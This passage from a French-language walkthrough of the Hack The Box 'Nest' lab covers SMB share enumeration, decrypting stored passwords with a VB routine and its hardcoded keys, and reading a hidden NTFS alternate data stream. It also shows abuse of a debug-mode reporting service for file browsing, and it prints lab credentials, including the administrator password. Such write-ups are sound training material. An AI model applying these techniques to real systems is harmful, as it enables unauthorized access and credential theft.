</code></pre></div><p>De la même façon que précédemment pour le fichier de bienvenue, on tombe rapidement en fouillant les répertoires de configuration sur un fichier intéressant, à priori utilisé pour un projet nommé &ldquo;RU Scanner&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>onfigs<span style="color:#ae81ff">\R</span>u Scanner<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:01:13 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:01:13 <span style="color:#ae81ff">2019</span>
  RU_config.xml                       A      <span style="color:#ae81ff">270</span>  Thu Aug  <span style="color:#ae81ff">8</span> 21:49:37 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545577</span> blocks available
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat RU_config.xml 
&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>?&gt;
&lt;ConfigFile xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> xmlns:xsd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span>&gt;
  &lt;Port&gt;389&lt;/Port&gt;
  &lt;Username&gt;c.smith&lt;/Username&gt;
  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE<span style="color:#f92672">=</span>&lt;/Password&gt;
&lt;/ConfigFile&gt;%
</code></pre></div><p>Un utilisateur ! Le password semble ici chiffré. Néanmoins, pas de doute, on est sur la bonne piste.
Nouvelle mission : trouver le projet &ldquo;RU Scanner&rdquo;. En effet, si ce dernier utilise des fichiers de configuration comme celui ci, alors il doit être en mesure de déchiffrer le mot de passe.</p>
<p>Je ne l&rsquo;ai pas mentionné au début de l&rsquo;article, mais cette machine repose essentiellement sur de la reconnaissance et de la prise d&rsquo;information. Une fois n&rsquo;est pas coutûme, ne pouvant pas avancer, on continue de fouiller les ressources accessibles. Une bonne idée peut être d&rsquo;aller fouiller les autres ressources du répertoire &ldquo;Configs&rdquo;. En effet, on y trouve par exemple une configuration pour le logiciel Notepad++.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>onfigs<span style="color:#ae81ff">\N</span>otepadPlusPlus<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:31:37 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:31:37 <span style="color:#ae81ff">2019</span>
  config.xml                          A     <span style="color:#ae81ff">6451</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:01:25 <span style="color:#ae81ff">2019</span>
  shortcuts.xml                       A     <span style="color:#ae81ff">2108</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:30:27 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><p>Ce fichier nous révèle notamment un chemin absolu vers le répertoire de l&rsquo;utilisateur <code>Carl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    &lt;History nbMaxFile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;15&#34;</span> inSubMenu<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no&#34;</span> customLength<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-1&#34;</span>&gt;
        &lt;File filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> /&gt;
        &lt;File filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\\HTB-NEST\Secure</span>$<span style="color:#e6db74">\IT\Carl\Temp.txt&#34;</span> /&gt;
        &lt;File filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> /&gt;
    &lt;/History&gt;
</code></pre></div><p>Même si nous n&rsquo;avons pas les droits pour lister le contenu du répertoire <code>IT</code>, il s&rsquo;avère qu&rsquo;il est possible de continuer dans l&rsquo;arborescence, si on dispose d&rsquo;un chemin valide. C&rsquo;est justement ce qu&rsquo;on vient de trouver. Ainsi, on peut se faufiler vers le répertoire de l&rsquo;utilisateur. :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:42:14 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:42:14 <span style="color:#ae81ff">2019</span>
  Docs                                D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:44:00 <span style="color:#ae81ff">2019</span>
  Reports                             D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 15:45:40 <span style="color:#ae81ff">2019</span>
  VB Projects                         D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 16:41:55 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><p>Le répertoire <code>VB Projects</code> indique clairement la voie. Quelques répertoires plus loin, on tombe sur le fameux projet <code>RUScanner</code> !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:54 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:54 <span style="color:#ae81ff">2019</span>
  bin                                 D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:00:11 <span style="color:#ae81ff">2019</span>
  ConfigFile.vb                       A      <span style="color:#ae81ff">772</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:09 <span style="color:#ae81ff">2019</span>
  Module1.vb                          A      <span style="color:#ae81ff">279</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:44 <span style="color:#ae81ff">2019</span>
  My Project                          D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:00:11 <span style="color:#ae81ff">2019</span>
  obj                                 D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:00:11 <span style="color:#ae81ff">2019</span>
  RU Scanner.vbproj                   A     <span style="color:#ae81ff">4828</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:37:51 <span style="color:#ae81ff">2019</span>
  RU Scanner.vbproj.user              A      <span style="color:#ae81ff">143</span>  Tue Aug  <span style="color:#ae81ff">6</span> 14:55:27 <span style="color:#ae81ff">2019</span>
  SsoIntegration.vb                   A      <span style="color:#ae81ff">133</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:58 <span style="color:#ae81ff">2019</span>
  Utils.vb                            A     <span style="color:#ae81ff">4888</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:49:35 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><p>Petite astuce pour télécharger l&rsquo;ensemble d&rsquo;un répertoire avec smbclient.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> mask <span style="color:#e6db74">&#34;&#34;</span>
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> recurse ON
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> prompt OFF
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> mget *
getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\C</span>onfigFile.vb of size <span style="color:#ae81ff">772</span> as ConfigFile.vb <span style="color:#f92672">(</span>1.8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.8 KiloBytes/sec<span style="color:#f92672">)</span>
...
</code></pre></div><h2 id="déchiffrement-et-shell-utilisateur">Déchiffrement et shell utilisateur</h2>
<p>Ayant maintenant le code source du projet VB, le but est d&rsquo;identifier les parties du codes permettant de réaliser le chiffrement/dechiffrement des mots de passe. Je ne vais pas rentrer dans les détails du code, mais une fonction <code>Decrypt</code> est identifiable assez facilement.</p>
<p>Cette dernière prend plusieurs variables en paramètre, dont le mot de passe chiffré. Si vous ne disposez pas de l&rsquo;environnement nécessaire pour travailler avec du VB, sachez qu&rsquo;il existe plusieurs services en ligne offrant un environnement virtuel simplifié.</p>
<p>C&rsquo;est notamment le cas de dotnetfiddle.com que j&rsquo;ai utilisé pour cette machine. On extrait ainsi la fonction de déchiffrement, que nous allons appeler dans un simple module, puis on affiche le résultat.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Imports System
Imports System.Security.Cryptography
Imports System.Text

Public Module Module1
    Public Sub Main<span style="color:#f92672">()</span>
        Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello World&#34;</span><span style="color:#f92672">)</span>
        Dim password As String
        password <span style="color:#f92672">=</span> Decrypt<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>, <span style="color:#e6db74">&#34;N3st22&#34;</span>, <span style="color:#e6db74">&#34;88552299&#34;</span>, 2, <span style="color:#e6db74">&#34;464R5DFA5DL6LE28&#34;</span>, 256<span style="color:#f92672">)</span>
        Console.WriteLine<span style="color:#f92672">(</span>password<span style="color:#f92672">)</span>
    End Sub
    
    Public Function Decrypt<span style="color:#f92672">(</span>ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer<span style="color:#f92672">)</span> _
                           As String

        Dim initVectorBytes As Byte<span style="color:#f92672">()</span>
        initVectorBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes<span style="color:#f92672">(</span>initVector<span style="color:#f92672">)</span>

        Dim saltValueBytes As Byte<span style="color:#f92672">()</span>
        saltValueBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes<span style="color:#f92672">(</span>saltValue<span style="color:#f92672">)</span>

        Dim cipherTextBytes As Byte<span style="color:#f92672">()</span>
        cipherTextBytes <span style="color:#f92672">=</span> Convert.FromBase64String<span style="color:#f92672">(</span>cipherText<span style="color:#f92672">)</span>

        Dim password As New Rfc2898DeriveBytes<span style="color:#f92672">(</span>passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations<span style="color:#f92672">)</span>

        Dim keyBytes As Byte<span style="color:#f92672">()</span>
        keyBytes <span style="color:#f92672">=</span> password.GetBytes<span style="color:#f92672">(</span>CInt<span style="color:#f92672">(</span>keySize / 8<span style="color:#f92672">))</span>

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode <span style="color:#f92672">=</span> CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor <span style="color:#f92672">=</span> symmetricKey.CreateDecryptor<span style="color:#f92672">(</span>keyBytes, initVectorBytes<span style="color:#f92672">)</span>

        Dim memoryStream As IO.MemoryStream
        memoryStream <span style="color:#f92672">=</span> New IO.MemoryStream<span style="color:#f92672">(</span>cipherTextBytes<span style="color:#f92672">)</span>

        Dim cryptoStream As CryptoStream
        cryptoStream <span style="color:#f92672">=</span> New CryptoStream<span style="color:#f92672">(</span>memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read<span style="color:#f92672">)</span>

        Dim plainTextBytes As Byte<span style="color:#f92672">()</span>
        ReDim plainTextBytes<span style="color:#f92672">(</span>cipherTextBytes.Length<span style="color:#f92672">)</span>

        Dim decryptedByteCount As Integer
        decryptedByteCount <span style="color:#f92672">=</span> cryptoStream.Read<span style="color:#f92672">(</span>plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length<span style="color:#f92672">)</span>

        memoryStream.Close<span style="color:#f92672">()</span>
        cryptoStream.Close<span style="color:#f92672">()</span>

        Dim plainText As String
        plainText <span style="color:#f92672">=</span> Encoding.ASCII.GetString<span style="color:#f92672">(</span>plainTextBytes, _
                                            0, _
                                            decryptedByteCount<span style="color:#f92672">)</span>

        Return plainText
    End Function
End Module
</code></pre></div><p>Le résultat ne se fait pas attendre, on obtient le mot de passe déchiffré !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hello World
xRxRxPANCAK3SxRxRx
</code></pre></div><p>Cela permet notamment de récupérer un accès à une nouvelle zone, ainsi que le flag utilisateur !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;c.smith&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Users
Enter WORKGROUP<span style="color:#ae81ff">\c</span>.smith<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> cd C.Smith<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:21:44 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:21:44 <span style="color:#ae81ff">2020</span>
  HQK Reporting                       D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:06:17 <span style="color:#ae81ff">2019</span>
  user.txt                            A       <span style="color:#ae81ff">32</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:05:24 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><h2 id="récupération-du-mot-de-passe-de-debug">Récupération du mot de passe de DEBUG</h2>
<p>Nouvel accès = nouvelle phase d&rsquo;énumération.
Le répertoire <code>HQK Reporting</code> attire notre attention. Souvenez vous, des informations similaires étaient remontées lors du scan nmap. Il est donc logique qu&rsquo;il s&rsquo;agisse du service de reporting.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:06:17 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:06:17 <span style="color:#ae81ff">2019</span>
  AD Integration Module               D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 14:18:42 <span style="color:#ae81ff">2019</span>
  Debug Mode Password.txt             A        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:08:17 <span style="color:#ae81ff">2019</span>
  HQK_Config_Backup.xml               A      <span style="color:#ae81ff">249</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:09:05 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6544215</span> blocks available
</code></pre></div><p>Lors de mes premières recherches sur la machine, j&rsquo;avais tenté de me connecter au service et j&rsquo;avais notamment pu voir une fonctionne de debugging, nécessitant un mot de passe. Cela tombe bien, l&rsquo;extrait ci-dessus mentionne un fichier <code>Debug Mode Password.txt</code>. Seul problème, le fichier semble vide (taille 0)&hellip;</p>
<p>C&rsquo;est notamment ici qu&rsquo;intervient une astuce au niveau du système de fichiers, les streams !
Pour faire simple, un stream est une séquence d&rsquo;octets contenants des informations sur un fichier. Il peut s&rsquo;agir de mots-clés, informations sur le propriétaire.. etc. Il est possible de créer différents streams.</p>
<p>Avec <code>smbclient</code> on peut notamment voir ces informations grâce à la commande suivante.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> allinfo <span style="color:#e6db74">&#34;Debug Mode Password.txt&#34;</span>
altname: DEBUGM~1.TXT
create_time:    Fri Aug  <span style="color:#ae81ff">9</span> 01:06:12 AM <span style="color:#ae81ff">2019</span> CEST
access_time:    Fri Aug  <span style="color:#ae81ff">9</span> 01:06:12 AM <span style="color:#ae81ff">2019</span> CEST
write_time:     Fri Aug  <span style="color:#ae81ff">9</span> 01:08:17 AM <span style="color:#ae81ff">2019</span> CEST
change_time:    Fri Aug  <span style="color:#ae81ff">9</span> 01:08:17 AM <span style="color:#ae81ff">2019</span> CEST
attributes: A <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span>
stream: <span style="color:#f92672">[</span>::$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">0</span> bytes
stream: <span style="color:#f92672">[</span>:Password:$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">15</span> bytes
</code></pre></div><p>On observe ainsi un élément intéressant&hellip; Le stream par défaut ($DATA) est en effet vide, mais un second stream, nommé &ldquo;Password&rdquo; a été créé !
<code>smbclient</code> offre également la possibilité de télécharger un fichier en spécifiant les steams souhaités.
Ainsi&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Debug Mode Password.txt:Password:</span>$Data<span style="color:#e6db74">&#34;</span>
getting file <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\D</span>ebug Mode Password.txt:Password:$Data of size <span style="color:#ae81ff">15</span> as Debug Mode Password.txt:Password:$Data <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>

$ cat Debug<span style="color:#ae81ff">\ </span>Mode<span style="color:#ae81ff">\ </span>Password.txt:Password:<span style="color:#ae81ff">\$</span>Data 
WBQ201953D8w 
</code></pre></div><h2 id="manipulation-du-service-de-reporting">Manipulation du service de Reporting</h2>
<p>La résolution de cette machine se poursuit sur le second service identifié lors du scan de ports.
On peut ainsi se connecter au service par l&rsquo;intermédiaire d&rsquo;un telnet.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.178 <span style="color:#ae81ff">4386</span>
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.

HQK Reporting Service V1.2

&gt;help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
</code></pre></div><p>Disposant maintenant du mot de passe de DEBUG, on peut lancer ce mode et ainsi récupérer un accès à plus de fonctionnalités.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
&gt;HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;
</code></pre></div><p>La commande <code>SERVICE</code> nous permet de prendre connaissance du binaire utilisé ici tandis que la commande <code>SESSION</code> nous indique le répertoire courant.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SERVICE

--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: <span style="color:#e6db74">&#34;C:\Program Files\HQK\HqkSvc.exe&#34;</span>
Server Running As: Service_HQK
Initial Query Directory: C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\H</span>QK<span style="color:#ae81ff">\A</span>LL QUERIES

&gt;SESSION

--- Session Information ---

Session ID: 32315e55-e64a-4b71-bf3f-124285e93ede
Debug: True
Started At: 3/29/2020 11:55:33 AM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.14.4:34380
Current Query Directory: C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\H</span>QK<span style="color:#ae81ff">\A</span>LL QUERIES
</code></pre></div><p>Par la suite, les commandes <code>SETDIR</code>, <code>LIST</code> et <code>SHOWQUERY</code> sont utilisées. Dans les fait, on peut s&rsquo;en servir comme un système nous permettant de parcourir l&rsquo;arborescence de la machine. En effet, il est possible d&rsquo;associer ces dernières aux commandes classique <code>cd</code>, <code>ls</code> et <code>cat</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SETDIR ../

Current directory set to HQK

&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

<span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>  ALL QUERIES
<span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>  LDAP
<span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>  Logs
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>   HqkSvc.exe
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>   HqkSvc.InstallState
<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>   HQK_Config.xml

Current Directory: HQK
</code></pre></div><p>Les répertoires <code>LDAP</code> et <code>Logs</code> attirent notre attention. C&rsquo;est notamment dans le répertoire <code>LDAP</code> qu&rsquo;on trouve notre bonheur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SETDIR LDAP

Current directory set to LDAP

&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>   HqkLdap.exe
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>   Ldap.conf

Current Directory: LDAP
</code></pre></div><p>Le fichier <code>Ldap.conf</code> révèle les informations souhaitées, à savoir le mot de passe, chiffré, de l&rsquo;administrateur !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SHOWQUERY <span style="color:#ae81ff">2</span>

Domain<span style="color:#f92672">=</span>nest.local
Port<span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>
BaseOu<span style="color:#f92672">=</span>OU<span style="color:#f92672">=</span>WBQ Users,OU<span style="color:#f92672">=</span>Production,DC<span style="color:#f92672">=</span>nest,DC<span style="color:#f92672">=</span>local
User<span style="color:#f92672">=</span>Administrator
Password<span style="color:#f92672">=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span style="color:#f92672">=</span>
</code></pre></div><h2 id="déchiffrement-et-escalade-de-privilège">Déchiffrement et escalade de privilège</h2>
<p>Ok, on a maintenant un mot de passe chiffré pour le compte privilégié !
Cette partie semblement directement utilisée par le processus afin de réaliser l&rsquo;authentification de l&rsquo;administrateur. Ainsi, cela veut dire que nous allons devoir interagir directement avec ce processus.</p>
<p>On commence par le récupérer en local.</p>
<p>Une fois cela fait, on peut décompiler le binaire. J&rsquo;utilise pour cela <code>dnSpy</code>. Je passe également ici la recherche d&rsquo;informations, mais on trouve rapidement la fonction de déchiffrement. Celle ci est identique à celle identifiée auparavant pour la partie utilisateur.</p>
<p>À ce moment, deux options afin de déchiffrer le mot de passe :</p>
<ul>
<li>Modifier le code du binaire, afin d&rsquo;afficher le mot de passe déchiffré, puis le recompiler et l&rsquo;exécuter ;</li>
<li>Utiliser une nouvelle fois notre environnement en ligne en modifiant les paramètres de la fonction.</li>
</ul>
<p>N&rsquo;étant pas très doué avec <code>dnSpy</code> et étant un peu blasé de cette machine, j&rsquo;ai pris la solution de facilité en réutilisant la même chose que pour l&rsquo;utilisateur :).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
Public Sub Main<span style="color:#f92672">()</span>
        Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello World&#34;</span><span style="color:#f92672">)</span>
        Dim password As String
        password <span style="color:#f92672">=</span> Decrypt<span style="color:#f92672">(</span>EncryptedString, <span style="color:#e6db74">&#34;667912&#34;</span>, <span style="color:#e6db74">&#34;1313Rf99&#34;</span>, 3, <span style="color:#e6db74">&#34;1L1SA61493DRV53Z&#34;</span>, 256, 256<span style="color:#f92672">)</span>
        Console.WriteLine<span style="color:#f92672">(</span>password<span style="color:#f92672">)</span>
    End Sub
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>Et ainsi : <code>XtH4nkS4Pl4y1nGX</code></p>
<p>Tadaaaam!
On peut filer récupérer le flag root.</p>
<p>Pour la petite histoire, je suis d&rsquo;abord allé voir sur le partage <code>Users</code> et voici ce que j&rsquo;ai trouvé.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;Administrator&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Users  
Unable to initialize messaging context
